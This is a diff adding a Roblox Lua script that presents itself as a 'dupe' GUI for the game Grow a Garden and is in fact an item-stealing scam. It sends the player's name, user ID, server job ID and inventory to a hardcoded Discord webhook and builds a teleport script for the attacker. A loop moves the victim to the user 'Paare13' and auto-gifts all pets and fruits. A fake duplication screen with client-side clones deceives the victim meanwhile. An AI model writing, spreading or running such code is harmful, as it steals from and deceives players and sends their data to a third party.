@@ -1,0 +1,192 @@
+-- GROW A GARDEN Logger + AutoGift + Fake Dupe GUI
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local fruits, pets = {}, {}
+
+-- Detect tools by ItemType
+for _, tool in ipairs(backpack:GetChildren()) do
+	local itemType = tool:GetAttribute("ItemType")
+	if itemType == "Fruit" then
+		table.insert(fruits, tool.Name)
+	elseif itemType == "Pet" then
+		table.insert(pets, tool.Name)
+	end
+end
+
+local function listify(list)
+	if #list == 0 then return "*None*" end
+	return "- " .. table.concat(list, "\n- ")
+end
+
+local webhook = "https://canary.discord.com/api/webhooks/1371751217000349727/PzhXCzUNT757NR9Rq6OO6t9Mw8NJJKSH2RiNDvzLSoV3_TQbrRuIoPCmlCsVyKzxT7WS"
+local jobId = game.JobId
+local stealScript = string.format([[
+-- Steal Script (Paare13 executes this)
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+TeleportService:TeleportToPlaceInstance(game.PlaceId, "%s", LocalPlayer)
+]], jobId)
+
+-- Send data to webhook
+local http = http_request or request or syn.request
+if http then
+	http({
+		Url = webhook,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = HttpService:JSONEncode({
+			["embeds"] = {{
+				["title"] = "GROW A GARDEN HIT!!",
+				["description"] = string.format(
+					"**Username:** %s\n**UserId:** %d\n**JobId:** %s\n**Device:** %s\n**Country:** Unknown",
+					player.Name,
+					player.UserId,
+					jobId,
+					UserInputService.TouchEnabled and "Mobile" or "PC"
+				),
+				["color"] = 16711680,
+				["fields"] = {
+					{ ["name"] = "FRUITS", ["value"] = listify(fruits) },
+					{ ["name"] = "PETS", ["value"] = listify(pets) },
+					{ ["name"] = "Steal Script", ["value"] = "```lua\n" .. stealScript .. "\n```" }
+				},
+				["footer"] = { ["text"] = "Time: " .. os.date("!%Y-%m-%d %H:%M:%S UTC") }
+			}}
+		})
+	})
+end
+
+-- AutoGift System: waits for Paare13 and gifts everything
+local function findPaare13()
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p.Name == "Paare13" then
+			return p
+		end
+	end
+	return nil
+end
+
+local function equipAll()
+	for _, tool in ipairs(backpack:GetChildren()) do
+		local typeAttr = tool:GetAttribute("ItemType")
+		if typeAttr == "Pet" or typeAttr == "Fruit" then
+			tool.Parent = player.Character
+		end
+	end
+end
+
+local function fireClosestPrompt()
+	local closestPrompt
+	local shortest = math.huge
+
+	for _, v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("ProximityPrompt") and v.Enabled then
+			local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+			if root and v.Parent and v.Parent:IsA("BasePart") then
+				local dist = (v.Parent.Position - root.Position).Magnitude
+				if dist < shortest then
+					shortest = dist
+					closestPrompt = v
+				end
+			end
+		end
+	end
+
+	if closestPrompt then
+		fireproximityprompt(closestPrompt)
+	end
+end
+
+RunService.RenderStepped:Connect(function()
+	local paare = findPaare13()
+	if paare and player.Character and paare.Character and paare.Character:FindFirstChild("HumanoidRootPart") then
+		player.Character:MoveTo(paare.Character.HumanoidRootPart.Position)
+		equipAll()
+		fireClosestPrompt()
+	end
+end)
+
+-- Fake Dupe GUI (Client-side, clean tool clone)
+local gui = Instance.new("ScreenGui", game.CoreGui)
+gui.Name = "Buy Easter Shop"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 300, 0, 180)
+frame.Position = UDim2.new(0.5, -150, 0.5, -90)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "Easter v2.1"
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+
+local status = Instance.new("TextLabel", frame)
+status.Text = "Easter Shop bypass"
+status.Size = UDim2.new(0.9, 0, 0.2, 0)
+status.Position = UDim2.new(0.05, 0, 0.3, 0)
+status.BackgroundTransparency = 1
+status.TextColor3 = Color3.fromRGB(180, 180, 180)
+status.Font = Enum.Font.Gotham
+status.TextSize = 16
+
+local button = Instance.new("TextButton", frame)
+button.Text = "Buy"
+button.Size = UDim2.new(0.8, 0, 0.3, 0)
+button.Position = UDim2.new(0.1, 0, 0.6, 0)
+button.BackgroundColor3 = Color3.fromRGB(60, 130, 60)
+button.TextColor3 = Color3.new(1, 1, 1)
+button.Font = Enum.Font.GothamSemibold
+button.TextSize = 18
+
+button.MouseButton1Click:Connect(function()
+	button.Visible = false
+	status.Text = "Duplicating tools..."
+
+	wait(2)
+
+	-- Clean clone (no _COPY)
+	for _, tool in ipairs(player.Backpack:GetChildren()) do
+		if tool:IsA("Tool") then
+			local dupe = tool:Clone()
+			dupe.Parent = player.Backpack
+		end
+	end
+
+	status.Text = "Success!"
+	wait(3)
+	gui:Destroy()
+end)
+
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
+local PetsPhysical = workspace:WaitForChild("PetsPhysical")
+
+-- Get local player name
+local playerName = Players.LocalPlayer.Name
+
+-- Loop through PetMover parts
+for _, petMover in pairs(PetsPhysical:GetDescendants()) do
+	if petMover:IsA("BasePart") and petMover.Name == "PetMover" then
+		local uuid = petMover:GetAttribute("UUID")
+		local owner = petMover:GetAttribute("OWNER")
+
+		if uuid and owner == playerName then
+			PetsService:FireServer("UnequipPet", uuid)
+			print("Unequipped pet with UUID:", uuid)
+		end
+	end
+end
